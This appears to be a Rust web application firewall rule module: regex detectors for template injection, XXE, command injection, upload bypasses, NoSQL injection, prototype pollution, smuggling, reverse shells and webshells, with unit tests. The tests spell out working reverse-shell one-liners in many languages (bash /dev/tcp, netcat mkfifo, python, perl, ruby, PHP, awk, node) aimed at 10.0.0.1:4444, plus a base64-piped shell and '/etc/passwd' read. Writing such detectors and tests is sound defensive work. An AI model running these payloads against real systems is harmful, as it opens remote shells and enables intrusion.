use super::{Action, Phase, RequestInfo, Rule, Severity};
use once_cell::sync::Lazy;
use regex::Regex;

// SSTI Regexes
static SSTI_001_REGEX: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(\{\{\s*[^}]+\s*\}\}|\$\{\s*[^}]+\s*\}|<%=\s*[^%]+\s*%>|\{\%\s*[^%]+\s*\%\}|\$\{.*\}|#\{.*\})"#).unwrap()
});

static SSTI_002_REGEX: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(__class__|__mro__|__subclasses__|__bases__|__globals__|os\.system|subprocess\.Popen|subprocess\.call|eval\s*\(|exec\s*\(|import\s+os|import\s+subprocess|jinja2\.Environment|django\.template|mako\.template)"#).unwrap()
});

// XXE Regexes
static XXE_001_REGEX: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)(<!DOCTYPE\s+[^>]+\s*\[|<!ENTITY\s+\w+\s+SYSTEM\s+["']|PUBLIC\s+["']|file://|http://|https://|ftp://|php://|expect://|data://)"#).unwrap()
});

static XXE_002_REGEX: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)(<!ENTITY\s+%\s+\w+\s+SYSTEM|%.+;|%\w+;|<!ENTITY\s+\w+\s+["']http)"#).unwrap()
});

// Command Injection Regexes
static CMDI_001_REGEX: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)([;&|]\s*(ls|cat|whoami|id|pwd|wget|curl|nc|netcat|bash|sh|python|perl|ruby|php|cmd|powershell|exec|system|passthru|shell_exec|proc_open|popen|eval\s*\(|assert\s*\()|`[^`]+`|\$\([^)]+\))"#).unwrap()
});

static CMDI_002_REGEX: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)(nslookup\s+[^\s]|dig\s+[^\s]|wget\s+[^\s]|curl\s+[^\s]|ping\s+[^\s]|traceroute\s+[^\s]|whois\s+[^\s]|burpcollaborator|dnslog|requestbin|interactsh|oastify|canarytokens)").unwrap()
});

// File Upload Regexes
static UPLOAD_001_REGEX: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)\.\s*(php|php3|php4|php5|phtml|phar|jsp|jspx|jspa|asp|aspx|ashx|ascx|asmx|cer|cdx|asa|exe|dll|bat|cmd|sh|bash|py|pl|rb|cgi|wsf|htaccess)"#).unwrap()
});

static UPLOAD_002_REGEX: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)(\.php\.|\.asp\.|\.jsp\.|\.php%00|\.php\x00|%00\.jpg|%00\.png|\.jpg\.php|\.png\.php|\.gif\.php|\.pdf\.php|\.doc\.php)"#).unwrap()
});

// Check functions
// NoSQL Injection Regexes (MongoDB/Express operators)
// Covers: $ne, $gt, $lt, $regex, $where, $nin, $exists, $type, $or, $and,
// $all, $size, $elemMatch — in body JSON, query params, and URL-encoded forms.
static NOSQL_001_REGEX: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)(\$ne|\$gt|\$lt|\$gte|\$lte|\$regex|\$where|\$nin|\$exists|\$type|\$or|\$and|\$all|\$size|\$elemMatch|\$not|\$nor|\$mod|\$options|\$slice|\$comment)"#).unwrap()
});

static NOSQL_002_REGEX: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)(\|\|\s*1\s*==\s*1|&&\s*1\s*==\s*1|\|\|\s*true\s*==\s*true|\|\|\s*['\"]?true['\"]?\s*$|\$where['\"]?\s*[:=]\s*['\"]?\s*function\s*\(|\.map\s*\(\s*function|\.find\s*\(\s*\{.*\$|\$\$)"#).unwrap()
});

// Prototype Pollution Regexes
// Covers: __proto__, constructor.prototype, prototype, in body JSON + query.
static PROTO_001_REGEX: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)(__proto__|constructor\s*\.\s*prototype|\bprototype\b|\[\s*['"]__proto__['"]\s*\])"#,
    )
    .unwrap()
});

fn check_nosql_001(req: &RequestInfo) -> bool {
    matches_payload(req, &NOSQL_001_REGEX)
}

fn check_nosql_002(req: &RequestInfo) -> bool {
    matches_payload(req, &NOSQL_002_REGEX)
}

fn check_proto_001(req: &RequestInfo) -> bool {
    matches_payload(req, &PROTO_001_REGEX)
}

fn matches_payload(req: &RequestInfo, regex: &Regex) -> bool {
    regex.is_match(req.body) || regex.is_match(req.query) || regex.is_match(req.path)
}

fn check_ssti_001(req: &RequestInfo) -> bool {
    matches_payload(req, &SSTI_001_REGEX)
}

fn check_ssti_002(req: &RequestInfo) -> bool {
    matches_payload(req, &SSTI_002_REGEX)
}

fn check_xxe_001(req: &RequestInfo) -> bool {
    matches_payload(req, &XXE_001_REGEX)
}

fn check_xxe_002(req: &RequestInfo) -> bool {
    matches_payload(req, &XXE_002_REGEX)
}

fn check_cmdi_001(req: &RequestInfo) -> bool {
    matches_payload(req, &CMDI_001_REGEX)
}

fn check_cmdi_002(req: &RequestInfo) -> bool {
    matches_payload(req, &CMDI_002_REGEX)
}

fn check_csrf_001(req: &RequestInfo) -> bool {
    if !matches!(req.method, "POST" | "PUT" | "PATCH" | "DELETE") {
        return false;
    }
    let content_type = req
        .headers
        .get("content-type")
        .map(|s| s.as_str())
        .unwrap_or("");
    // Hanya check untuk form submissions (klasik CSRF)
    if !content_type.contains("application/x-www-form-urlencoded")
        && !content_type.contains("multipart/form-data")
    {
        return false;
    }
    let origin = req.headers.get("origin");
    let referer = req.headers.get("referer");
    origin.is_none() && referer.is_none()
}

fn check_csrf_002(req: &RequestInfo) -> bool {
    if !matches!(req.method, "POST" | "PUT" | "PATCH" | "DELETE") {
        return false;
    }
    let content_type = req
        .headers
        .get("content-type")
        .map(|s| s.as_str())
        .unwrap_or("");
    let origin = req.headers.get("origin");
    content_type.contains("application/json") && origin.is_none()
}

fn check_upload_001(req: &RequestInfo) -> bool {
    UPLOAD_001_REGEX.is_match(req.body) || UPLOAD_001_REGEX.is_match(req.query)
}

fn check_upload_002(req: &RequestInfo) -> bool {
    UPLOAD_002_REGEX.is_match(req.body) || UPLOAD_002_REGEX.is_match(req.query)
}

fn check_upload_003(req: &RequestInfo) -> bool {
    if req.body.len() > 100 {
        let start = &req.body[..100];
        start.contains("<?php") || start.contains("<?=")
    } else {
        false
    }
}

fn check_smuggle_001(req: &RequestInfo) -> bool {
    let cl = req.headers.contains_key("content-length");
    let te = req
        .headers
        .get("transfer-encoding")
        .map(|v| v.contains("chunked"))
        .unwrap_or(false);
    cl && te
}

fn check_smuggle_002(req: &RequestInfo) -> bool {
    req.headers.contains_key(":authority")
        || req.headers.contains_key(":method")
        || req.headers.contains_key(":path")
        || req.headers.contains_key(":scheme")
}

/// ── Comprehensive Reverse Shell & Obfuscation Detection ──────────────────────────────────
static REVSHELL_BASH_TCP: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)(bash.*\/dev\/(tcp|udp)\/|exec\s+[0-9]*<>\/dev\/(tcp|udp)\/|0<&[0-9]+;\s*exec\s+[0-9]+<>\/dev\/|bash\s+\-i\s*>&|sh\s+\-i\s*<&|\b(bash|sh|zsh|dash|ksh|ash)\b\s*\-c\s*["'].*\/dev\/(tcp|udp)|while\s+read\s+line;?\s*do\s*\$line)"#,
    )
    .unwrap()
});
static REVSHELL_PYTHON: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)(python[23]?\s*\-c\s*["'].*socket|python[23]?.*pty\.spawn|python[23]?.*subprocess|python[23]?.*os\.dup2|python[23]?.*socket\.connect)"#,
    )
    .unwrap()
});
static REVSHELL_PHP: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)((f|pf)sockopen\s*\(|php.*exec\s*\(.*(bash|sh|cmd)|shell_exec\s*\(.*(bash|sh|cmd)|php.*passthru\s*\(|popen\s*\(.*(bash|sh|cmd)|proc_open\s*\(.*(bash|sh|cmd)|eval\s*\(\s*(base64_decode|gzinflate|gzuncompress)|assert\s*\(\s*\$_(GET|POST|REQUEST))"#,
    )
    .unwrap()
});
static REVSHELL_NETCAT: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)(\b(nc|ncat|netcat|nc\.traditional|nc\.openbsd|nc\.exe|ncat\.exe)\b.*(\-[ec]\s+|\-\-exec\s+|\-\-ssl|\-\-udp|/bin/sh|/bin/bash|cmd\.exe)|mkfifo\s+/tmp/|mknod\s+/tmp/)"#,
    )
    .unwrap()
});
static REVSHELL_POWERSHELL: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)(-e(nc(odedcommand)?)?\s+[A-Za-z0-9+/=]{15,}|New\-Object\s+.*Net\.(Sockets\.TCPClient|Sockets\.UDPClient|WebClient)|powershell.*(DownloadString|DownloadFile)|Invoke\-PowerShellTcp|\[System\.Text\.Encoding\]::UTF8|\bIEX\b.*New\-Object)"#,
    )
    .unwrap()
});
static REVSHELL_SOCAT: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)(socat\s+(TCP|UDP).*(EXEC|PTY|FILE:)|socat\s+EXEC:.*(tcp|udp):)"#).unwrap()
});
static REVSHELL_PERL: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)(perl\s*\-e\s*["'].*(Socket|IO::Socket|inet_aton|STDIN.*>&S|exec.*\/bin\/(sh|bash)))"#,
    )
    .unwrap()
});
static REVSHELL_RUBY: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)(ruby\s*\-r?\s*socket\s*\-e\s*["'].*(TCPSocket|IO\.pipe|exec\s+sprintf))"#)
        .unwrap()
});
static REVSHELL_LANG_EXOTIC: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)(awk\s+["']BEGIN\s*\{\s*s\s*=\s*"/inet\/(tcp|udp)|lua\s+\-e\s*["'].*socket\.(tcp|connect)|go\s+run.*net\.Dial\s*\(\s*["'](tcp|udp)|node\s+\-e\s*["'].*(net\.Socket|child_process)|Runtime\.getRuntime\(\)\.exec|ProcessBuilder.*redirectErrorStream|openssl\s+s_client\s+\-quiet\s+\-connect|telnet\s+.*\|\s*\/bin\/(sh|bash)|busybox\s+(nc|sh|telnet))"#,
    )
    .unwrap()
});
static REVSHELL_OBFUSCATED: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)(echo\s+[A-Za-z0-9+/=]{20,}\s*\|\s*base64\s+\-[dD]\s*\|\s*(sh|bash|zsh)|\$IFS[0-9]*|base64\s+\-\-decode\s*\|\s*(sh|bash)|\/b\?n\/b\?sh|\/usr\/b\?n\/p\?th\?n)"#,
    )
    .unwrap()
});
// Webshell common patterns
static WEBSHELL_GENERIC: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)((cmd|exec|shell|backdoor|webshell)\.(php|asp|aspx|jsp|py)|<?=.*\$_GET|<?=.*\$_POST|<?=.*\$_REQUEST|cmd\s*=\s*[\"']?(whoami|id|ls|cat|pwd|uname)[\"']?)"#).unwrap()
});

fn check_revshell_bash(req: &RequestInfo) -> bool {
    REVSHELL_BASH_TCP.is_match(req.body) || REVSHELL_BASH_TCP.is_match(req.query)
}
fn check_revshell_python(req: &RequestInfo) -> bool {
    REVSHELL_PYTHON.is_match(req.body) || REVSHELL_PYTHON.is_match(req.query)
}
fn check_revshell_php(req: &RequestInfo) -> bool {
    REVSHELL_PHP.is_match(req.body) || REVSHELL_PHP.is_match(req.query)
}
fn check_revshell_netcat(req: &RequestInfo) -> bool {
    REVSHELL_NETCAT.is_match(req.body) || REVSHELL_NETCAT.is_match(req.query)
}
fn check_revshell_powershell(req: &RequestInfo) -> bool {
    REVSHELL_POWERSHELL.is_match(req.body) || REVSHELL_POWERSHELL.is_match(req.query)
}
fn check_revshell_socat(req: &RequestInfo) -> bool {
    REVSHELL_SOCAT.is_match(req.body) || REVSHELL_SOCAT.is_match(req.query)
}
fn check_revshell_perl(req: &RequestInfo) -> bool {
    REVSHELL_PERL.is_match(req.body) || REVSHELL_PERL.is_match(req.query)
}
fn check_revshell_ruby(req: &RequestInfo) -> bool {
    REVSHELL_RUBY.is_match(req.body) || REVSHELL_RUBY.is_match(req.query)
}
fn check_revshell_lang_exotic(req: &RequestInfo) -> bool {
    REVSHELL_LANG_EXOTIC.is_match(req.body) || REVSHELL_LANG_EXOTIC.is_match(req.query)
}
fn check_revshell_obfuscated(req: &RequestInfo) -> bool {
    REVSHELL_OBFUSCATED.is_match(req.body) || REVSHELL_OBFUSCATED.is_match(req.query)
}
fn check_webshell_generic(req: &RequestInfo) -> bool {
    WEBSHELL_GENERIC.is_match(req.body) || WEBSHELL_GENERIC.is_match(req.query)
}

// SQLi: quote-wrapped tautology (1' OR '1'='1, admin' AND '1'='1)
fn check_sqli_quote_tautology(req: &RequestInfo) -> bool {
    let body_lower = req.body.to_lowercase();
    let query_lower = req.query.to_lowercase();
    let input = if !body_lower.is_empty() {
        &body_lower
    } else {
        &query_lower
    };
    // Pattern: <quote> or <quote> or <quote> and <quote> or <quote>||<quote>
    input.contains("' or '")
        || input.contains("' and '")
        || input.contains("'||'")
        || input.contains("'&&'")
}

pub static BODY_RULES: &[Rule] = &[
    Rule {
        id: "NOSQL-001",
        name: "NoSQL Injection - MongoDB Operator (Basic)",
        phase: Phase::Body,
        action: Action::Block,
        severity: Severity::Critical,
        description: "MongoDB operator injection ($ne, $gt, $regex, etc.)",
        check: check_nosql_001,
    },
    Rule {
        id: "NOSQL-002",
        name: "NoSQL Injection - JS Tautology / $where (Advanced)",
        phase: Phase::Body,
        action: Action::Block,
        severity: Severity::Critical,
        description: "NoSQL injection via JS tautology or $where function",
        check: check_nosql_002,
    },
    Rule {
        id: "PROTO-001",
        name: "Prototype Pollution",
        phase: Phase::Body,
        action: Action::Block,
        severity: Severity::High,
        description: "Prototype pollution via __proto__/constructor.prototype",
        check: check_proto_001,
    },
    Rule {
        id: "SSTI-001",
        name: "Server-Side Template Injection (Basic)",
        phase: Phase::Body,
        action: Action::Block,
        severity: Severity::High,
        description: "Template expression injection",
        check: check_ssti_001,
    },
    Rule {
        id: "SSTI-002",
        name: "SSTI - RCE via Object Traversal (Advanced)",
        phase: Phase::Body,
        action: Action::Block,
        severity: Severity::Critical,
        description: "SSTI leading to RCE via object traversal",
        check: check_ssti_002,
    },
    Rule {
        id: "XXE-001",
        name: "XML External Entity (Basic)",
        phase: Phase::Body,
        action: Action::Block,
        severity: Severity::Critical,
        description: "XML External Entity declaration",
        check: check_xxe_001,
    },
    Rule {
        id: "XXE-002",
        name: "XXE - Blind / Parameter Entity (Advanced)",
        phase: Phase::Body,
        action: Action::Block,
        severity: Severity::Critical,
        description: "Blind XXE using parameter entity",
        check: check_xxe_002,
    },
    Rule {
        id: "CMDI-001",
        name: "Command Injection (Basic)",
        phase: Phase::Body,
        action: Action::Block,
        severity: Severity::Critical,
        description: "Command injection via shell metacharacters",
        check: check_cmdi_001,
    },
    Rule {
        id: "CMDI-002",
        name: "Command Injection - Blind OOB (Advanced)",
        phase: Phase::Body,
        action: Action::Block,
        severity: Severity::High,
        description: "Blind command injection with OOB exfiltration",
        check: check_cmdi_002,
    },
    Rule {
        id: "CSRF-001",
        name: "CSRF - Missing Origin/Referer (Basic)",
        phase: Phase::Body,
        action: Action::Log,
        severity: Severity::Medium,
        description: "State-changing request without Origin or Referer header",
        check: check_csrf_001,
    },
    Rule {
        id: "CSRF-002",
        name: "CSRF - JSON Content-Type (Advanced)",
        phase: Phase::Body,
        action: Action::Log,
        severity: Severity::Medium,
        description: "JSON request without proper CORS/Origin validation",
        check: check_csrf_002,
    },
    Rule {
        id: "UPLOAD-001",
        name: "File Upload - Bad Extension (Basic)",
        phase: Phase::Body,
        action: Action::Block,
        severity: Severity::Critical,
        description: "Upload of executable or dangerous file type",
        check: check_upload_001,
    },
    Rule {
        id: "UPLOAD-002",
        name: "File Upload - Extension Bypass (Advanced)",
        phase: Phase::Body,
        action: Action::Block,
        severity: Severity::Critical,
        description: "File upload extension bypass attempt",
        check: check_upload_002,
    },
    Rule {
        id: "UPLOAD-003",
        name: "File Upload - Polyglot (Advanced)",
        phase: Phase::Body,
        action: Action::Block,
        severity: Severity::High,
        description: "Potential polyglot file with embedded PHP",
        check: check_upload_003,
    },
    Rule {
        id: "SMUGGLE-001",
        name: "HTTP Request Smuggling",
        phase: Phase::Body,
        action: Action::Block,
        severity: Severity::High,
        description: "Both Content-Length and Transfer-Encoding present (HRS)",
        check: check_smuggle_001,
    },
    Rule {
        id: "SMUGGLE-002",
        name: "HTTP/2 Downgrade Smuggling (Advanced)",
        phase: Phase::Body,
        action: Action::Block,
        severity: Severity::High,
        description: "HTTP/2 pseudo-headers in HTTP/1.1 request (downgrade attack)",
        check: check_smuggle_002,
    },
    Rule {
        id: "SQLI-QUOTE-TAUTOLOGY",
        name: "SQLi - Quote-Wrapped Tautology Bypass",
        phase: Phase::Body,
        action: Action::Block,
        severity: Severity::Critical,
        description:
            "SQLi with OR/AND tautology wrapped in single quotes (bypasses semantic engine)",
        check: check_sqli_quote_tautology,
    },
    // ── Reverse Shell Detection ──
    Rule {
        id: "REVSHELL-001",
        name: "Reverse Shell — Bash / Dev Network Socket",
        phase: Phase::Body,
        action: Action::Block,
        severity: Severity::Critical,
        description: "Bash/sh reverse shell via /dev/tcp, /dev/udp, or subshell loops",
        check: check_revshell_bash,
    },
    Rule {
        id: "REVSHELL-002",
        name: "Reverse Shell — Python socket/pty/subprocess",
        phase: Phase::Body,
        action: Action::Block,
        severity: Severity::Critical,
        description: "Python reverse shell via socket, pty.spawn, or subprocess",
        check: check_revshell_python,
    },
    Rule {
        id: "REVSHELL-003",
        name: "Reverse Shell — PHP fsockopen/exec/eval",
        phase: Phase::Body,
        action: Action::Block,
        severity: Severity::Critical,
        description: "PHP reverse shell via (p)fsockopen, exec, shell_exec, passthru, or eval",
        check: check_revshell_php,
    },
    Rule {
        id: "REVSHELL-004",
        name: "Reverse Shell — Netcat / Ncat / Mkfifo",
        phase: Phase::Body,
        action: Action::Block,
        severity: Severity::Critical,
        description: "Netcat/Ncat reverse shell or FIFO pipe redirection",
        check: check_revshell_netcat,
    },
    Rule {
        id: "REVSHELL-005",
        name: "Reverse Shell — PowerShell Encoded/TcpClient",
        phase: Phase::Body,
        action: Action::Block,
        severity: Severity::Critical,
        description: "PowerShell reverse shell with EncodedCommand, TCPClient, or DownloadString",
        check: check_revshell_powershell,
    },
    Rule {
        id: "REVSHELL-006",
        name: "Reverse Shell — Socat EXEC/PTY",
        phase: Phase::Body,
        action: Action::Block,
        severity: Severity::High,
        description: "Socat reverse shell with EXEC, PTY, or TCP/UDP socket",
        check: check_revshell_socat,
    },
    Rule {
        id: "REVSHELL-007",
        name: "Reverse Shell — Perl Socket / IO::Socket",
        phase: Phase::Body,
        action: Action::Block,
        severity: Severity::Critical,
        description: "Perl reverse shell via Socket or IO::Socket::INET",
        check: check_revshell_perl,
    },
    Rule {
        id: "REVSHELL-008",
        name: "Reverse Shell — Ruby TCPSocket / Pipe",
        phase: Phase::Body,
        action: Action::Block,
        severity: Severity::Critical,
        description: "Ruby reverse shell via TCPSocket or IO.pipe",
        check: check_revshell_ruby,
    },
    Rule {
        id: "REVSHELL-009",
        name: "Reverse Shell — Exotic Languages (AWK/Lua/Go/Node/Java/OpenSSL)",
        phase: Phase::Body,
        action: Action::Block,
        severity: Severity::Critical,
        description: "Reverse shell using AWK, Lua, Golang, Node.js, Java, OpenSSL, or Telnet",
        check: check_revshell_lang_exotic,
    },
    Rule {
        id: "REVSHELL-010",
        name: "Reverse Shell — Obfuscated / Base64 / IFS Pipe",
        phase: Phase::Body,
        action: Action::Block,
        severity: Severity::Critical,
        description: "Obfuscated reverse shell using Base64 pipe to shell, $IFS, or wildcard paths",
        check: check_revshell_obfuscated,
    },
    Rule {
        id: "WEBSHELL-001",
        name: "Webshell — Generic Patterns",
        phase: Phase::Body,
        action: Action::Block,
        severity: Severity::Critical,
        description: "Generic webshell patterns in body or query",
        check: check_webshell_generic,
    },
];

#[cfg(test)]
mod tests {
    use super::*;
    use ahash::AHashMap;

    fn make_req<'a>(body: &'a str, query: &'a str) -> RequestInfo<'a> {
        static HEADERS: Lazy<AHashMap<String, String>> = Lazy::new(AHashMap::new);
        RequestInfo {
            method: "POST",
            path: "/submit",
            query,
            headers: &HEADERS,
            body,
            ip: None,
        }
    }

    #[test]
    fn test_revshell_bash() {
        let req1 = make_req("cmd=bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "");
        assert!(check_revshell_bash(&req1));

        let req2 = make_req("cmd=exec 5<>/dev/tcp/1.2.3.4/8080", "");
        assert!(check_revshell_bash(&req2));
    }

    #[test]
    fn test_revshell_python() {
        let req = make_req("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0); import pty;pty.spawn(\"/bin/bash\")'", "");
        assert!(check_revshell_python(&req));
    }

    #[test]
    fn test_revshell_php() {
        let req = make_req(
            "<?php $sock=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\"); ?>",
            "",
        );
        assert!(check_revshell_php(&req));
    }

    #[test]
    fn test_revshell_netcat() {
        let req = make_req("nc -e /bin/bash 10.0.0.1 4444", "");
        assert!(check_revshell_netcat(&req));

        let req2 = make_req(
            "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f",
            "",
        );
        assert!(check_revshell_netcat(&req2));
    }

    #[test]
    fn test_revshell_powershell() {
        let req = make_req("powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444);...\"", "");
        assert!(check_revshell_powershell(&req));

        let req2 = make_req(
            "powershell -EncodedCommand aW1wb3J0LXBvd2Vyc2hlbGx0Y3A=",
            "",
        );
        assert!(check_revshell_powershell(&req2));
    }

    #[test]
    fn test_revshell_perl() {
        let req = make_req("perl -e 'use Socket;$i=\"10.0.0.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");exec(\"/bin/sh -i\");};'", "");
        assert!(check_revshell_perl(&req));
    }

    #[test]
    fn test_revshell_ruby() {
        let req = make_req("ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'", "");
        assert!(check_revshell_ruby(&req));
    }

    #[test]
    fn test_revshell_exotic() {
        let req_awk = make_req("awk 'BEGIN {s = \"/inet/tcp/0/10.0.0.1/4444\"; while(42) { printf \"shell>\" |& s; s |& getline c; }}'", "");
        assert!(check_revshell_lang_exotic(&req_awk));

        let req_node = make_req("node -e 'const net = require(\"net\"), cp = require(\"child_process\"); const client = new net.Socket(); client.connect(4444, \"10.0.0.1\");'", "");
        assert!(check_revshell_lang_exotic(&req_node));
    }

    #[test]
    fn test_revshell_obfuscated() {
        let req = make_req(
            "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | sh",
            "",
        );
        assert!(check_revshell_obfuscated(&req));

        let req_ifs = make_req("cat$IFS/etc/passwd", "");
        assert!(check_revshell_obfuscated(&req_ifs));
    }

    #[test]
    fn test_nosql_001_operators() {
        // MongoDB operator injection in JSON body
        let req1 = make_req(r#"{"username":{"$ne":null},"password":{"$ne":null}}"#, "");
        assert!(check_nosql_001(&req1));

        // $gt operator in query
        let req2 = make_req("", "user[$gt]=&pass[$gt]=");
        assert!(check_nosql_001(&req2));

        // $regex operator
        let req3 = make_req(r#"{"q":{"$regex":".*"},"role":"admin"}"#, "");
        assert!(check_nosql_001(&req3));

        // $where operator
        let req4 = make_req(r#"{"$where":"this.password.length > 0"}"#, "");
        assert!(check_nosql_001(&req4));

        // $or operator
        let req5 = make_req(r#"{"$or":[{"user":"admin"}]}"#, "");
        assert!(check_nosql_001(&req5));

        // Benign: no operators
        let benign = make_req(r#"{"username":"admin","password":"secret"}"#, "");
        assert!(!check_nosql_001(&benign));
    }

    #[test]
    fn test_nosql_002_tautology() {
        // $or with true/gt in JSON — detected by NOSQL-001 (operator), but
        // ALSO exercises the OR-tautology shape in NOSQL-002 via || form:
        // JS || tautology
        let req1 = make_req("user=admin||1==1", "");
        assert!(check_nosql_002(&req1));

        // && 1==1 tautology
        let req2 = make_req("user=admin&&1==1", "");
        assert!(check_nosql_002(&req2));

        // $where function injection
        let req3 = make_req(r#"{"$where":"function() { return true; }"}"#, "");
        assert!(check_nosql_002(&req3));

        // Benign tautology-free
        let benign = make_req(r#"{"username":"admin","password":"secret"}"#, "");
        assert!(!check_nosql_002(&benign));
    }

    #[test]
    fn test_proto_001_pollution() {
        // __proto__ in JSON body
        let req1 = make_req(r#"{"__proto__":{"isAdmin":true}}"#, "");
        assert!(check_proto_001(&req1));

        // constructor.prototype
        let req2 = make_req(r#"{"constructor":{"prototype":{"isAdmin":true}}}"#, "");
        assert!(check_proto_001(&req2));

        // __proto__ in query
        let req3 = make_req("", "__proto__[isAdmin]=true");
        assert!(check_proto_001(&req3));

        // constructor[prototype] in query
        let req4 = make_req("", "constructor[prototype][x]=y");
        assert!(check_proto_001(&req4));

        // Benign: no pollution
        let benign = make_req(r#"{"username":"admin"}"#, "");
        assert!(!check_proto_001(&benign));
    }
}
